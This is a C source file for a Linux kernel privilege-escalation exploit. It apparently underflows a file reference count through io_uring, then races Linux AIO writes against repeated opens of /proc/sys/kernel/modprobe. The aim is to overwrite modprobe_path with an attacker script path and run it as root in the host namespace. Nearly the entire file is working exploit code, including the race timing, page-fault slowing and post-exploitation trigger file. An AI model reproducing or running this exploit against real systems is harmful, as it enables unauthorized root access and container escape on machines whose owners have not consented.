#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <liburing.h>
#include <pthread.h>
#include <signal.h>
#include <linux/aio_abi.h>
#include <linux/kcmp.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <err.h>
#include "kutil.h"

#define NUM_FD 512

#define TARGET_PATH "/tmp/target"
#define VICTIM_PATH "/proc/sys/kernel/modprobe"
#define SCRIPT_FILE "a.sh"
#define TRIGGER_FILE "b"

#define MMAP_ADDR ((void *) 0xdead0000)
#define MIB_PAGES (1ul << 12)

#define NSEC_PER_SEC 1000000000UL

#define DELAY 20000000 // ...and this

#define SYSCHK(x) ({              \
	typeof(x) __res = (x);        \
	if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
	__res;                        \
})

char buf[0x100];
int mfd;
size_t shmem_sz = (MIB_PAGES * 64) * PAGE_SIZE;
int cfd[2];

struct timespec thread_launch_ts;
struct io_uring r;
unsigned long aio;
int target;
struct io_uring_sqe *sqe;

char str[0x100];

struct timespec get_mono_time(void) {
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts;
}

unsigned long timespec_to_ns(struct timespec ts) {
	return ts.tv_sec * NSEC_PER_SEC + ts.tv_nsec;
}

void ts_add(struct timespec *ts, unsigned long nsecs) {
	ts->tv_nsec += nsecs;
	if (ts->tv_nsec >= NSEC_PER_SEC) {
		ts->tv_sec++;
		ts->tv_nsec -= NSEC_PER_SEC;
	}
}

bool ts_is_in_future(struct timespec ts) {
	struct timespec cur = get_mono_time();
	if (ts.tv_sec > cur.tv_sec) {
		return true;
	}
	if (ts.tv_sec < cur.tv_sec) {
		return false;
	}
	return ts.tv_nsec > cur.tv_nsec;
}

void *thread(void *ptr) {
	force_single_core(0);
	printf("[T] hello from thread\n");
	
	while (ts_is_in_future(thread_launch_ts)); // Wait for launch time
	
	struct timespec start = get_mono_time();
	
	for (int i=0; i<NUM_FD; i++) {
		open(VICTIM_PATH, O_RDONLY);
	}
	
	struct timespec end = get_mono_time();

	printf("[T] done spraying, took %lu ns\n", timespec_to_ns(end) - timespec_to_ns(start));
}

void *slow_thread(void *ptr) {
	force_single_core(1);
	read(cfd[0],buf,1);
	fallocate(mfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, shmem_sz);
}

int main(int argc, char **argv) {
	force_single_core(0);
	
	debug("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1\\/tmp\\/" SCRIPT_FILE "/p' /proc/mounts", str, sizeof(str));
	*(strchr(str, '\n')+1) = '\0'; // We need the \n for strcmp later (there is no other reason)
	printf("[*] will attempt to write %s to modprobe_path\n", str);
	
	int triggerfd = open(TRIGGER_FILE, O_RDWR | O_CREAT | O_TRUNC, 0777);
	write(triggerfd, "\xff\xff\xff\xff", 4);
	close(triggerfd);
	printf("[*] prepared helper files for post-exploitation\n");
	
	socketpair(AF_UNIX,SOCK_STREAM,0,cfd);

	printf("[+] done with init\n\n");

	io_uring_queue_init(8, &r, 0);
	printf("[*] created io_uring\n");
	
	target = open(TARGET_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
	
	// Register target file as fixed file.
	if (io_uring_register_files(&r, &target, 1) < 0) {
		perror("[-] io_uring_register_files");
	}
	printf("[*] registered %s (fd = %d) as fixed file\n\n", TARGET_PATH, target);

	// Setup Linux kernel AIO stuff (not POSIX AIO!!)
	if (syscall(SYS_io_setup, 8, &aio) < 0) {
		perror("[-] io_setup");
		exit(-1);
	}
	
	// Prepare request.
	// We want the last byte of the buffer that's passed to the kernel to be on a new page.

	void * page = mmap(MMAP_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	struct iovec * iov = page + PAGE_SIZE - 0xf;
	iov->iov_base = str;
	*(int *)(&iov->iov_len) = strlen(str); // iov_len is 8 bytes long. We only write 4 bytes so we don't touch the next page (which we haven't allocated yet anyways).
	
	struct iocb cb = {0};
	cb.aio_lio_opcode = IOCB_CMD_PWRITEV;
	cb.aio_fildes = target;
	cb.aio_buf = (uint64_t) iov;
	cb.aio_nbytes = 1;

	struct iocb *cb_arr[1];
	cb_arr[0] = &cb;
	
	// Now we want to severely slow down the fifth page (containing the last dangling byte).
	mfd = memfd_create("x", 0);
	void * addr = mmap(MMAP_ADDR + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, 0);
	fallocate(mfd, 0, 0, shmem_sz);
	
	printf("[*] request prepared\n");

	// We will decrement the refcount of the file until it underflows. This prevents the kernel from softlocking when it calls fget() on the file later.
	for (int i = 0; i < 5; i++) {
		sqe = io_uring_get_sqe(&r);
		io_uring_prep_msg_ring(sqe, 0, 0, 0, 0);
		sqe->flags |= IOSQE_FIXED_FILE;
	}
	
	io_uring_submit_and_wait(&r, 5);
	
	force_single_core(1);
	
	struct timespec base_time = get_mono_time();

	struct itimerspec its = { .it_value = base_time };
	ts_add(&its.it_value, 100000 * 1000); // timer initial value set at +100 ms
	
	struct timespec my_launch_ts = its.it_value;
	ts_add(&its.it_value, DELAY);
	thread_launch_ts = its.it_value;
	
	pthread_t t, t2;
	
	pthread_create(&t, 0, thread, 0);
	pthread_create(&t2, 0, slow_thread, 0);
	
	while (ts_is_in_future(my_launch_ts)); // Wait for launch time
	
	write(cfd[1],buf,1);
	struct timespec start = get_mono_time();
	int retval = syscall(SYS_io_submit, aio, 1, cb_arr);
	struct timespec end = get_mono_time();
	
	printf("[*] io_submit took %lu ns\n", timespec_to_ns(end) - timespec_to_ns(start));
	//pthread_join(t, NULL); // This would be nice, but it has a chance to crash the kernel for some reason
	
	if (retval != 1) {
		perror("[-] io_submit");
		exit(-1);
	}
	
	// We could attempt to get the completion event from aio, but this also has a chance to crash the kernel for some reason :)))))
	// Let's just sleep instead

	sleep(1);
	
	char temp[0x100];
	memset(temp, 0, sizeof(temp));
	debug("cat " VICTIM_PATH, temp, sizeof(temp));
	
	if (!strcmp(temp, str)) {
		printf("[+] wow!! i overwrote modprobe\n");
		printf("======\n");
		printf("[+] write payload shell script to be executed in host namespace to " SCRIPT_FILE "\n");
		printf("[+] then execute ./b to run\n");
		usleep(100000);
	}
}

